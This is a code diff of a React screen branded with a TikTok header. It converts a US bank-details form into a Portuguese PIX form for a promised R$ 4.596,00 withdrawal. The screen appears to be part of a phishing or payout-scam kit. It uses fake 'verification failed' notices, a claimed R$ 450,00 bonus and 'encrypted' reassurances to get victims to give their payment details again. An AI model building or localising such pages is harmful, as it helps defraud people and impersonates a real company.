@@ -1,14 +1,7 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { ShieldCheck, ChevronRight, Building2, Wallet, DollarSign, Smartphone, Mail, Globe, AlertCircle } from "lucide-react";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select";
+import { ShieldCheck, ChevronRight, Smartphone, AlertCircle, QrCode } from "lucide-react";
 import TikTokHeader from "./TikTokHeader";
 
 interface BankDetailsScreenProps {
@@ -17,174 +10,88 @@ interface BankDetailsScreenProps {
   isReverification?: boolean;
 }
 
-const WITHDRAWAL_METHODS = [
-  { id: "bank", label: "Bank transfer", subtitle: "Direct deposit to your bank", icon: Building2 },
-  { id: "paypal", label: "PayPal", subtitle: "Send to your PayPal email", icon: Wallet },
-  { id: "cashapp", label: "Cash App", subtitle: "Send to your $Cashtag", icon: DollarSign },
-  { id: "venmo", label: "Venmo", subtitle: "Send to your Venmo username", icon: Smartphone },
-  { id: "zelle", label: "Zelle", subtitle: "Send to email or phone", icon: Mail },
-  { id: "wire", label: "Wire Transfer", subtitle: "International or domestic wire", icon: Globe },
+const PIX_KEY_TYPES = [
+  { id: "cpf", label: "CPF" },
+  { id: "cnpj", label: "CNPJ" },
+  { id: "email", label: "E-mail" },
+  { id: "phone", label: "Telefone" },
+  { id: "random", label: "Chave Aleatória" },
 ];
 
-const US_BANKS = [
-  "Bank of America", "Chase (JPMorgan Chase)", "Wells Fargo", "Citibank",
-  "U.S. Bank", "PNC Bank", "Capital One", "TD Bank", "Truist Financial",
-  "Goldman Sachs", "Morgan Stanley", "Charles Schwab", "HSBC Bank USA",
-  "BMO Harris Bank", "Citizens Financial Group", "Fifth Third Bank",
-  "KeyBank", "Huntington National Bank", "Regions Bank", "M&T Bank",
-  "Ally Bank", "Discover Bank", "Synchrony Bank", "American Express National Bank",
-];
+type Step = "form" | "confirm";
 
-type Step = "method" | "form" | "confirm";
+const formatBRL = (value: number) =>
+  value.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
 const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: BankDetailsScreenProps) => {
-  const [step, setStep] = useState<Step>("method");
-  const [selectedMethod, setSelectedMethod] = useState("");
-  const [details, setDetails] = useState<Record<string, string>>({});
-  const [confirmField, setConfirmField] = useState("");
+  const [step, setStep] = useState<Step>("form");
+  const [keyType, setKeyType] = useState("cpf");
+  const [pixKey, setPixKey] = useState("");
+  const [recipientName, setRecipientName] = useState("");
   const [submitting, setSubmitting] = useState(false);
 
-  const method = WITHDRAWAL_METHODS.find((m) => m.id === selectedMethod);
-
-  const updateDetail = (key: string, value: string) =>
-    setDetails((prev) => ({ ...prev, [key]: value }));
+  const selectedKeyType = PIX_KEY_TYPES.find((t) => t.id === keyType);
 
   const isFormValid = () => {
-    if (selectedMethod === "bank" || selectedMethod === "wire") {
-      return (
-        details.bank && (details.routing?.length ?? 0) >= 9 &&
-        (details.account?.length ?? 0) >= 4 && details.account === confirmField
-      );
-    }
-    if (selectedMethod === "paypal" || selectedMethod === "zelle") {
-      return (details.email?.length ?? 0) > 3;
-    }
-    if (selectedMethod === "cashapp") {
-      return (details.cashtag?.length ?? 0) > 1;
-    }
-    if (selectedMethod === "venmo") {
-      return (details.username?.length ?? 0) > 1;
-    }
-    return false;
+    return pixKey.trim().length > 2 && recipientName.trim().length > 1;
   };
+
+  const details = { keyType: selectedKeyType?.label ?? keyType, pixKey, recipientName };
 
   const handleConfirm = async () => {
     setSubmitting(true);
-    await onSubmit(selectedMethod, details);
+    await onSubmit("pix", { keyType: selectedKeyType?.label ?? keyType, pixKey, recipientName });
     setSubmitting(false);
   };
 
-  // --- METHOD SELECTION ---
-  if (step === "method") {
-    return (
-      <div className="min-h-screen flex flex-col bg-background">
-        <TikTokHeader showHelp />
-        <div className="flex-1 px-6 py-6">
-          <p className="text-sm text-muted-foreground mb-1">
-            Welcome back, <strong className="text-foreground">{userName}!</strong>
-          </p>
-          <div className="mt-4 mb-2 flex items-center justify-between">
-            <h2 className="text-xl font-semibold">Add withdrawal method</h2>
-            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-              Step 3 of 4
-            </span>
-          </div>
-          <p className="text-sm text-muted-foreground mb-5">
-            Choose how you'd like to receive your funds.
-          </p>
-
-          {isReverification && (
-            <div className="space-y-3 mb-5">
-              <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-destructive/5 border border-destructive/20">
-                <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
-                <div>
-                  <p className="text-xs font-semibold text-destructive">Bank verification failed</p>
-                  <p className="text-xs text-muted-foreground mt-0.5">
-                    Your previous bank details couldn&apos;t be verified by our payment processor. This can happen when the routing number doesn&apos;t match the bank, or the account has restrictions on incoming transfers.
-                  </p>
-                </div>
-              </div>
-              <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-secondary border border-border">
-                <ShieldCheck className="w-4 h-4 text-primary shrink-0 mt-0.5" />
-                <div>
-                  <p className="text-xs font-semibold">Why do I need to re-enter my details?</p>
-                  <p className="text-xs text-muted-foreground mt-0.5">
-                    To protect your funds, our payment processor requires accurate withdrawal information. Please double-check your bank name, routing number, and account number before submitting. Your compensation bonus of $450.00 has already been credited to your balance.
-                  </p>
-                </div>
-              </div>
-            </div>
-          )}
-
-          <div className="rounded-2xl border border-border bg-card overflow-hidden">
-            {WITHDRAWAL_METHODS.map((m, i) => {
-              const Icon = m.icon;
-              return (
-                <button
-                  key={m.id}
-                  onClick={() => { setSelectedMethod(m.id); setStep("form"); }}
-                  className={`w-full flex items-center gap-3.5 px-4 py-3.5 text-left hover:bg-accent/50 transition-colors ${
-                    i < WITHDRAWAL_METHODS.length - 1 ? "border-b border-border" : ""
-                  }`}
-                >
-                  <div className="w-10 h-10 rounded-xl bg-secondary flex items-center justify-center shrink-0">
-                    <Icon className="w-5 h-5 text-foreground" />
-                  </div>
-                  <div className="flex-1 min-w-0">
-                    <p className="text-sm font-medium">{m.label}</p>
-                    <p className="text-xs text-muted-foreground">{m.subtitle}</p>
-                  </div>
-                  <ChevronRight className="w-4 h-4 text-muted-foreground shrink-0" />
-                </button>
-              );
-            })}
-          </div>
-        </div>
-      </div>
-    );
-  }
-
   // --- CONFIRMATION ---
   if (step === "confirm") {
-    const entries = Object.entries(details).filter(([, v]) => v);
     return (
       <div className="min-h-screen flex flex-col bg-background">
         <TikTokHeader showHelp />
         <div className="flex-1 px-6 py-6">
           <div className="mt-4 mb-2 flex items-center justify-between">
-            <h2 className="text-xl font-semibold">Confirm your details</h2>
+            <h2 className="text-xl font-semibold">Confirme seus dados</h2>
             <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-              Step 3 of 4
+              Passo 3 de 4
             </span>
           </div>
           <p className="text-sm text-muted-foreground mb-6">
-            Review your {method?.label} information before submitting.
+            Revise as informações do seu PIX antes de enviar.
           </p>
 
           <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
             <div>
-              <p className="text-xs text-muted-foreground">Method</p>
-              <p className="text-sm font-medium">{method?.label}</p>
+              <p className="text-xs text-muted-foreground">Método</p>
+              <p className="text-sm font-medium">PIX</p>
             </div>
-            {entries.map(([key, value]) => (
-              <div key={key}>
-                <div className="h-px bg-border" />
-                <div className="pt-4">
-                  <p className="text-xs text-muted-foreground capitalize">{key.replace(/([A-Z])/g, " $1")}</p>
-                  <p className="text-sm font-medium">
-                    {key === "account"
-                      ? value.slice(0, -4).replace(/./g, "•") + value.slice(-4)
-                      : value}
-                  </p>
-                </div>
+            <div>
+              <div className="h-px bg-border" />
+              <div className="pt-4">
+                <p className="text-xs text-muted-foreground">Tipo de chave</p>
+                <p className="text-sm font-medium">{details.keyType}</p>
               </div>
-            ))}
+            </div>
+            <div>
+              <div className="h-px bg-border" />
+              <div className="pt-4">
+                <p className="text-xs text-muted-foreground">Chave PIX</p>
+                <p className="text-sm font-medium">{details.pixKey}</p>
+              </div>
+            </div>
+            <div>
+              <div className="h-px bg-border" />
+              <div className="pt-4">
+                <p className="text-xs text-muted-foreground">Nome do recebedor</p>
+                <p className="text-sm font-medium">{details.recipientName}</p>
+              </div>
+            </div>
           </div>
 
           <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
             <ShieldCheck className="w-4 h-4 text-success shrink-0" />
             <p className="text-xs text-muted-foreground">
-              Your data is <strong className="text-foreground">encrypted</strong> and protected.
+              Seus dados estão <strong className="text-foreground">criptografados</strong> e protegidos.
             </p>
           </div>
 
@@ -192,143 +99,118 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
             {submitting ? (
               <span className="flex items-center gap-2">
                 <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
-                Processing...
+                Processando...
               </span>
             ) : (
-              "Confirm & Continue"
+              "Confirmar e Continuar"
             )}
           </Button>
           <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
-            ← Go back and edit
+            ← Voltar e editar
           </Button>
         </div>
       </div>
     );
   }
 
-  // --- FORM (per method) ---
-  const isBankType = selectedMethod === "bank" || selectedMethod === "wire";
-
+  // --- FORM ---
   return (
     <div className="min-h-screen flex flex-col bg-background">
       <TikTokHeader showHelp />
       <div className="flex-1 px-6 py-6">
+        <p className="text-sm text-muted-foreground mb-1">
+          Bem-vindo de volta, <strong className="text-foreground">{userName}!</strong>
+        </p>
         <div className="mt-4 mb-2 flex items-center justify-between">
-          <h2 className="text-xl font-semibold">{method?.label} details</h2>
+          <h2 className="text-xl font-semibold">Dados do PIX</h2>
           <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-            Step 3 of 4
+            Passo 3 de 4
           </span>
         </div>
         <p className="text-sm text-muted-foreground mb-4">
-          Enter your {method?.label} information to receive your withdrawal.
+          Informe sua chave PIX para receber o saque de <strong className="text-foreground">R$ 4.596,00</strong>.
         </p>
+
+        {isReverification && (
+          <div className="space-y-3 mb-5">
+            <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-destructive/5 border border-destructive/20">
+              <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
+              <div>
+                <p className="text-xs font-semibold text-destructive">Falha na verificação PIX</p>
+                <p className="text-xs text-muted-foreground mt-0.5">
+                  Sua chave PIX anterior não pôde ser verificada pelo nosso processador de pagamentos. Isso pode acontecer quando a chave está incorreta ou a conta possui restrições para receber transferências.
+                </p>
+              </div>
+            </div>
+            <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-secondary border border-border">
+              <ShieldCheck className="w-4 h-4 text-primary shrink-0 mt-0.5" />
+              <div>
+                <p className="text-xs font-semibold">Por que preciso informar novamente?</p>
+                <p className="text-xs text-muted-foreground mt-0.5">
+                  Para proteger seus fundos, nosso processador de pagamentos exige informações de saque precisas. Por favor, verifique sua chave PIX e o nome do recebedor antes de enviar. Seu bônus de compensação de R$ 450,00 já foi creditado ao seu saldo.
+                </p>
+              </div>
+            </div>
+          </div>
+        )}
 
         <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
           <ShieldCheck className="w-4 h-4 text-success shrink-0" />
           <p className="text-xs text-muted-foreground">
-            Your data is <strong className="text-foreground">encrypted</strong> and securely stored.
+            Seus dados estão <strong className="text-foreground">criptografados</strong> e armazenados com segurança.
           </p>
         </div>
 
         <div className="space-y-4">
-          {isBankType && (
-            <>
-              <div>
-                <label className="text-sm font-medium mb-1.5 block">Select your bank</label>
-                <Select value={details.bank || ""} onValueChange={(v) => updateDetail("bank", v)}>
-                  <SelectTrigger className="h-12 rounded-xl">
-                    <SelectValue placeholder="Choose a bank..." />
-                  </SelectTrigger>
-                  <SelectContent className="max-h-60">
-                    {US_BANKS.map((b) => (
-                      <SelectItem key={b} value={b}>{b}</SelectItem>
-                    ))}
-                  </SelectContent>
-                </Select>
-              </div>
-              <div>
-                <label className="text-sm font-medium mb-1.5 block">Routing Number</label>
-                <Input
-                  type="text" inputMode="numeric" maxLength={9} placeholder="9 digits"
-                  value={details.routing || ""}
-                  onChange={(e) => updateDetail("routing", e.target.value.replace(/\D/g, ""))}
-                  className="h-12 rounded-xl"
-                />
-                {(details.routing?.length ?? 0) > 0 && (details.routing?.length ?? 0) < 9 && (
-                  <p className="text-xs text-destructive mt-1">Must be 9 digits</p>
-                )}
-              </div>
-              <div>
-                <label className="text-sm font-medium mb-1.5 block">Account Number</label>
-                <Input
-                  type="text" inputMode="numeric" maxLength={17} placeholder="Enter account number"
-                  value={details.account || ""}
-                  onChange={(e) => updateDetail("account", e.target.value.replace(/\D/g, ""))}
-                  className="h-12 rounded-xl"
-                />
-              </div>
-              <div>
-                <label className="text-sm font-medium mb-1.5 block">Confirm Account Number</label>
-                <Input
-                  type="text" inputMode="numeric" maxLength={17} placeholder="Re-enter account number"
-                  value={confirmField}
-                  onChange={(e) => setConfirmField(e.target.value.replace(/\D/g, ""))}
-                  className="h-12 rounded-xl"
-                />
-                {confirmField.length > 0 && details.account !== confirmField && (
-                  <p className="text-xs text-destructive mt-1">Account numbers don't match</p>
-                )}
-              </div>
-            </>
-          )}
+          <div>
+            <label className="text-sm font-medium mb-1.5 block">Tipo de chave PIX</label>
+            <div className="grid grid-cols-3 gap-2">
+              {PIX_KEY_TYPES.map((t) => (
+                <button
+                  key={t.id}
+                  onClick={() => setKeyType(t.id)}
+                  className={`h-11 rounded-xl text-sm font-medium transition-all ${
+                    keyType === t.id
+                      ? "bg-foreground text-primary-foreground"
+                      : "bg-secondary text-muted-foreground hover:bg-accent"
+                  }`}
+                >
+                  {t.label}
+                </button>
+              ))}
+            </div>
+          </div>
 
-          {selectedMethod === "paypal" && (
-            <div>
-              <label className="text-sm font-medium mb-1.5 block">PayPal Email</label>
+          <div>
+            <label className="text-sm font-medium mb-1.5 block">Chave PIX</label>
+            <div className="relative">
+              <QrCode className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
               <Input
-                type="email" placeholder="you@example.com"
-                value={details.email || ""}
-                onChange={(e) => updateDetail("email", e.target.value)}
-                className="h-12 rounded-xl"
+                type="text"
+                placeholder={
+                  keyType === "cpf" ? "000.000.000-00" :
+                  keyType === "cnpj" ? "00.000.000/0000-00" :
+                  keyType === "email" ? "seu@email.com" :
+                  keyType === "phone" ? "+55 (00) 00000-0000" :
+                  "Chave aleatória"
+                }
+                value={pixKey}
+                onChange={(e) => setPixKey(e.target.value)}
+                className="h-12 rounded-xl pl-11"
               />
             </div>
-          )}
+          </div>
 
-          {selectedMethod === "cashapp" && (
-            <div>
-              <label className="text-sm font-medium mb-1.5 block">$Cashtag</label>
-              <Input
-                type="text" placeholder="$YourCashtag"
-                value={details.cashtag || ""}
-                onChange={(e) => updateDetail("cashtag", e.target.value)}
-                className="h-12 rounded-xl"
-              />
-            </div>
-          )}
-
-          {selectedMethod === "venmo" && (
-            <div>
-              <label className="text-sm font-medium mb-1.5 block">Venmo Username</label>
-              <Input
-                type="text" placeholder="@username"
-                value={details.username || ""}
-                onChange={(e) => updateDetail("username", e.target.value)}
-                className="h-12 rounded-xl"
-              />
-            </div>
-          )}
-
-          {selectedMethod === "zelle" && (
-            <div>
-              <label className="text-sm font-medium mb-1.5 block">Zelle Email or Phone</label>
-              <Input
-                type="text" placeholder="Email or phone number"
-                value={details.email || ""}
-                onChange={(e) => updateDetail("email", e.target.value)}
-                className="h-12 rounded-xl"
-              />
-            </div>
-          )}
+          <div>
+            <label className="text-sm font-medium mb-1.5 block">Nome do recebedor</label>
+            <Input
+              type="text"
+              placeholder="Nome completo do titular"
+              value={recipientName}
+              onChange={(e) => setRecipientName(e.target.value)}
+              className="h-12 rounded-xl"
+            />
+          </div>
         </div>
 
         <Button
@@ -336,10 +218,7 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
           disabled={!isFormValid()}
           className="w-full h-14 rounded-full text-base font-semibold mt-8"
         >
-          Continue
-        </Button>
-        <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); setConfirmField(""); }} className="w-full mt-3 text-sm text-muted-foreground">
-          ← Change method
+          Continuar
         </Button>
       </div>
     </div>
